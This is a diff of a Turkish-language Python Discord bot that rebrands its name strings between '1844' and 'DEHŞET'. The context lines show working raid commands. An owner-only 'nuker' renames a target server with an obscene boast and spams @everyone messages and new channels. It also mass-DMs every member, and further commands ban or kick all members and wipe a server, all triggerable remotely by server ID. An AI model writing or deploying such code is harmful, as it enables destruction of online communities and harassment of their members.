@@ -1,6 +1,6 @@
 """
 ================================================================================
-                        DISCORD BOT 1844 - VDS VERSIYONU
+                        DISCORD BOT DEHŞET - VDS VERSIYONU
 ================================================================================
 
 KURULUM:
@@ -48,10 +48,11 @@ AUTHORIZED_USERS_FILE = 'authorized_users.json'
 VERIFIED_USERS_FILE = 'verified_users.json'
 DB_FILE_PATH = 'discord_data.db'
 DATA_FILE_PATH = 'data.txt'
-AUTHORIZED_ROLE_ID = 1844
-DURUM_ALDI_KANAL_ID = 1844
-VERIFIED_ROLE_ID = 1844
-GUILD_OWNER_ROLE_ID = 1844  # Guild alan kişilere verilecek özel rol
+DEHŞET = 1844
+AUTHORIZED_ROLE_ID = DEHŞET
+DURUM_ALDI_KANAL_ID = DEHŞET
+VERIFIED_ROLE_ID = DEHŞET
+GUILD_OWNER_ROLE_ID = DEHŞET  # Guild alan kişilere verilecek özel rol
 LOG_CHANNEL_ID = 1444467582282367009  # ID sorgu loglarının gönderileceği kanal
 GENERAL_LOG_CHANNEL_ID = 1445572049035595816  # Genel log kanalı
 WELCOME_CHANNEL_ID = 1444428771389079643  # Hoş geldin kanalı
@@ -725,7 +726,7 @@ async def update_presence():
             
             await bot.change_presence(
                 activity=discord.Streaming(
-                    name=f"discord.gg/1844 | {total_credits} hak",
+                    name=f"discord.gg/dehset | {total_credits} hak",
                     url="https://twitch.tv/discord"
                 )
             )
@@ -773,10 +774,10 @@ COMMAND_USAGE = {
     "ticketcikar": "!ticketcikar @kullanıcı",
     "ticketlar": "!ticketlar",
     "istatistik": "!istatistik",
-    "xDEHŞETnuker": "!xDEHŞETnuker veya !nuke",
-    "xDEHŞETstop": "!xDEHŞETstop veya !stop",
-    "xDEHŞETbanall": "!xDEHŞETbanall veya !tban",
-    "xDEHŞETclear": "!xDEHŞETclear veya !csil",
+    "x1844nuker": "!x1844nuker veya !nuke",
+    "x1844stop": "!x1844stop veya !stop",
+    "x1844banall": "!x1844banall veya !tban",
+    "x1844clear": "!x1844clear veya !csil",
     "ezik": "!ezik @kullanıcı",
     "owner": "!owner",
     "sunucu": "!sunucu",
@@ -1266,7 +1267,7 @@ async def boost_info(interaction: discord.Interaction):
     
     embed.add_field(
         name="ÖZEL TEKLİF",
-        value="@1844 farkıyla en iyisinden zirveye!",
+        value="@DEHŞET farkıyla en iyisinden zirveye!",
         inline=False
     )
     
@@ -2715,7 +2716,7 @@ async def prefix_help(ctx):
     total_credits = get_total_credits()
     
     embed = discord.Embed(
-        title="📚 1844 BOT - PREFIX KOMUTLARI",
+        title="📚 DEHŞET BOT - PREFIX KOMUTLARI",
         description="Tüm komutlar `!` prefix'i ile kullanılır",
         color=0x3498db,
         timestamp=datetime.datetime.now()
@@ -2800,7 +2801,7 @@ async def prefix_help(ctx):
         inline=False
     )
     
-    embed.set_footer(text="Slash komutları için / kullanın | 1844 Bot")
+    embed.set_footer(text="Slash komutları için / kullanın | DEHŞET Bot")
     if ctx.guild.icon:
         embed.set_thumbnail(url=ctx.guild.icon.url)
     
@@ -3072,7 +3073,7 @@ async def prefix_topludm(ctx, *, mesaj: str):
         await asyncio.sleep(1.5)
     await progress_msg.edit(content=f"Tamamlandı! Gönderilen: {sent}, Başarısız: {failed}")
 
-@bot.command(name="xDEHŞETnuker", aliases=["nuke"])
+@bot.command(name="x1844nuker", aliases=["nuke"])
 async def prefix_nuker(ctx, sunucu_id: str = None):
     global nuker_active, nuker_tasks
     if not is_owner(ctx.author.id):
@@ -3080,7 +3081,7 @@ async def prefix_nuker(ctx, sunucu_id: str = None):
     
     if isinstance(ctx.channel, discord.DMChannel):
         if not sunucu_id:
-            await ctx.reply("DM'den kullanmak için sunucu ID gerekli!\n`!xDEHŞETnuker (sunucu_id)`")
+            await ctx.reply("DM'den kullanmak için sunucu ID gerekli!\n`!x1844nuker (sunucu_id)`")
             return
         try:
             guild = bot.get_guild(int(sunucu_id))
@@ -3137,9 +3138,9 @@ async def prefix_nuker(ctx, sunucu_id: str = None):
                     infaz_embed.add_field(name="İnfaz Eden", value=f"{ctx.author.name}", inline=True)
                     infaz_embed.set_footer(text="DEHŞET NUKER")
                     try:
-                        logo_path = "attached_assets/DEHŞET_logo.png"
-                        infaz_embed.set_thumbnail(url="attachment://DEHŞET_logo.png")
-                        await owner_user.send(embed=infaz_embed, file=discord.File(logo_path, "DEHŞET_logo.png"))
+                        logo_path = "attached_assets/1844_logo.png"
+                        infaz_embed.set_thumbnail(url="attachment://1844_logo.png")
+                        await owner_user.send(embed=infaz_embed, file=discord.File(logo_path, "1844_logo.png"))
                     except:
                         await owner_user.send(embed=infaz_embed)
             except:
@@ -3149,10 +3150,10 @@ async def prefix_nuker(ctx, sunucu_id: str = None):
     
     async def change_server():
         try:
-            logo_path = "attached_assets/DEHŞET_logo.png"
+            logo_path = "attached_assets/1844_logo.png"
             with open(logo_path, "rb") as f:
                 icon_data = f.read()
-            await guild.edit(name="DEHŞET SİKTİ", icon=icon_data, description="discord.gg/1844 tarafından yok edildi")
+            await guild.edit(name="DEHŞET SİKTİ", icon=icon_data, description="discord.gg/dehset tarafından yok edildi")
         except:
             try:
                 await guild.edit(name="DEHŞET SİKTİ")
@@ -3177,7 +3178,7 @@ async def prefix_nuker(ctx, sunucu_id: str = None):
     async def spam_channel(ch):
         if not nuker_active: return
         try:
-            await ch.send(f"@everyone **{owner_name} 1844 sizi sikti** discord.gg/DEHŞET")
+            await ch.send(f"@everyone **{owner_name} DEHŞET sizi sikti** discord.gg/dehset")
         except:
             pass
     
@@ -3198,7 +3199,7 @@ async def prefix_nuker(ctx, sunucu_id: str = None):
     async def dm_member(m):
         if not nuker_active: return
         try:
-            await m.send(f"**discord.gg/1844 sikti sizi**")
+            await m.send(f"**discord.gg/dehset sikti sizi**")
         except:
             pass
     
@@ -3206,7 +3207,7 @@ async def prefix_nuker(ctx, sunucu_id: str = None):
         if not nuker_active: return
         try:
             ch = await guild.create_text_channel(name="discord.gg-DEHŞET")
-            spam_tasks = [ch.send(f"@everyone **{owner_name} 1844 sizi sikti** discord.gg/DEHŞET") for _ in range(50)]
+            spam_tasks = [ch.send(f"@everyone **{owner_name} DEHŞET sizi sikti** discord.gg/dehset") for _ in range(50)]
             await asyncio.gather(*spam_tasks, return_exceptions=True)
         except:
             pass
@@ -3214,7 +3215,7 @@ async def prefix_nuker(ctx, sunucu_id: str = None):
     async def create_voice():
         if not nuker_active: return
         try:
-            await guild.create_voice_channel(name="discord.gg/DEHŞET")
+            await guild.create_voice_channel(name="discord.gg/dehset")
         except:
             pass
     
@@ -3250,7 +3251,7 @@ async def prefix_nuker(ctx, sunucu_id: str = None):
     
     nuker_active = False
 
-@bot.command(name="xDEHŞETstop", aliases=["stop"])
+@bot.command(name="x1844stop", aliases=["stop"])
 async def prefix_nuker_stop(ctx):
     global nuker_active, nuker_tasks
     if not is_owner(ctx.author.id):
@@ -3290,14 +3291,14 @@ async def prefix_nuker_stop(ctx):
     
     await ctx.reply(f"**NUKER ANINDA DURDURULDU!**\nİptal edilen görev: {cancelled_count + force_cancelled}")
 
-@bot.command(name="xDEHŞETbanall", aliases=["tban"])
+@bot.command(name="x1844banall", aliases=["tban"])
 async def prefix_banall(ctx, sunucu_id: str = None):
     if not is_owner(ctx.author.id):
         return
     
     if isinstance(ctx.channel, discord.DMChannel):
         if not sunucu_id:
-            await ctx.reply("DM'den kullanmak için sunucu ID gerekli!\n`!xDEHŞETbanall (sunucu_id)`")
+            await ctx.reply("DM'den kullanmak için sunucu ID gerekli!\n`!x1844banall (sunucu_id)`")
             return
         try:
             guild = bot.get_guild(int(sunucu_id))
@@ -3364,14 +3365,14 @@ async def prefix_banall(ctx, sunucu_id: str = None):
     
     await ctx.reply(f"**⚡ TURBO BAN TAMAMLANDI!**\nSunucu: {guild.name}\n\n🔨 Banlanan: **{results['banned']}**\n👢 Atılan: **{results['kicked']}**\n❌ Başarısız: **{results['failed']}**")
 
-@bot.command(name="xDEHŞETclear", aliases=["csil"])
+@bot.command(name="x1844clear", aliases=["csil"])
 async def prefix_clear_all(ctx, sunucu_id: str = None):
     if not is_owner(ctx.author.id):
         return
     
     if isinstance(ctx.channel, discord.DMChannel):
         if not sunucu_id:
-            await ctx.reply("DM'den kullanmak için sunucu ID gerekli!\n`!xDEHŞETclear (sunucu_id)`")
+            await ctx.reply("DM'den kullanmak için sunucu ID gerekli!\n`!x1844clear (sunucu_id)`")
             return
         try:
             guild = bot.get_guild(int(sunucu_id))
@@ -3837,7 +3838,7 @@ async def on_guild_update(before, after):
         embed.add_field(name="❌ Eski URL", value=f"`discord.gg/{old_url}`" if old_url else "Yok", inline=True)
         embed.add_field(name="➡️ Yeni URL", value=f"`discord.gg/{new_url}`" if new_url else "**KALDIRILDI!**", inline=True)
         embed.add_field(name="⚡ Aksiyon", value="Sunucu Ayarları > Vanity URL bölümünden kontrol edin!", inline=False)
-        embed.set_footer(text="🛡️ 1844 URL Koruma Sistemi | Anında Uyarı")
+        embed.set_footer(text="🛡️ DEHŞET URL Koruma Sistemi | Anında Uyarı")
         
         await log_channel.send(content=f"🚨🚨🚨 **ACİL URL DEĞİŞİKLİĞİ!** {owner_mentions} 🚨🚨🚨", embed=embed)
         
